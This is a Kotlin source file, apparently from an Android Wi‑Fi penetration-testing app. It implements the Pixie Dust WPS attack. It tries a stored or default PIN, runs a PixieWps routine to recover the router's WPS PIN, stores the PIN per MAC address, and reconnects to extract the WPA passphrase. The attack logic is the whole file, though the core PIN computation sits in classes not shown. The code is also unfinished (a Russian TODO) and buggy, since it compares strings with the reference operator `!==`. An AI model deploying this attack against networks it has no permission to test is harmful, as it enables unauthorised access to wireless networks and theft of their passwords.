package com.example.wifi_pentester.utils.pixieDustAttack

import android.content.Context
import com.example.wifi_pentester.utils.listeners.MessageListener
import com.example.wifi_pentester.utils.Serializer

enum class PixieDustStatus {
    Scan, RunPixieWps, ReceivedWps, Connected, Fail, Closed
}

class PixieDust(private val context: Context, private val connectResult: WpsConnectResult) {
    private var statusListener = MessageListener { i: PixieDustStatus -> }
    private var messageListener = MessageListener { i: String -> }
    private var resultListener = MessageListener { i: WpsConnectResult -> }

    private val wpsConnectRoot: WpsConnectRoot = WpsConnectRoot(context, connectResult)


    fun setStatusListener(pixieDustStatusListener: MessageListener<PixieDustStatus>) {
       this.statusListener = pixieDustStatusListener
    }

    fun setMessageListener(messageListener: MessageListener<String>) {
        this.messageListener = messageListener
    }

    fun setResultListener(resultListener: MessageListener<WpsConnectResult>) {
        this.resultListener = resultListener
    }

    fun runAttach() {
        val wpsPin = Serializer.Deserialize<Int>(String.format("wps_pin_%s", connectResult.mac), context)

        val isRunPixieWps = wpsPin == null || wpsConnectRoot.status == WpsConnectRoot.Status.Fail;
        val defaultPin = 12345678;

        wpsConnectRoot.connect(wpsPin ?: defaultPin, isRunPixieWps)
        wpsConnectRoot.setPixieWpsInfoLister { pixieWps: PixieWps ->
            statusListener.toSend(PixieDustStatus.RunPixieWps)
            runPixieWps(pixieWps)
        }
        wpsConnectRoot.setResultListener { result: WpsConnectResult ->
            if (result.wpaPsk !== "") {
                resultListener.toSend(result)
                statusListener.toSend(PixieDustStatus.Connected)
            } else {
                statusListener.toSend(PixieDustStatus.Fail)
            }
        }
    }

    private fun runPixieWps(pixieWps: PixieWps) {
        pixieWps.setMessageListener { m: String? -> messageListener.toSend(m!!) }
        pixieWps.setResultListener { wpsPin: Int ->
            if (wpsPin != 0) {
                wpsConnectRoot.close()
                statusListener.toSend(PixieDustStatus.ReceivedWps)
                Serializer.Serialize(wpsPin, String.format("wps_pin_%s", connectResult.mac), context)
                wpsConnectRoot.connect(wpsPin, false)
                // добавиь код подключения по паролю
            } else {
                close()
                statusListener.toSend(PixieDustStatus.Fail)
            }
        }
        pixieWps.run()
    }

    fun close() {
        wpsConnectRoot.close()
        statusListener.toSend(PixieDustStatus.Closed)
    }

    init {
        wpsConnectRoot.setMessageListener { m: String? -> messageListener.toSend(m!!) }
    }
}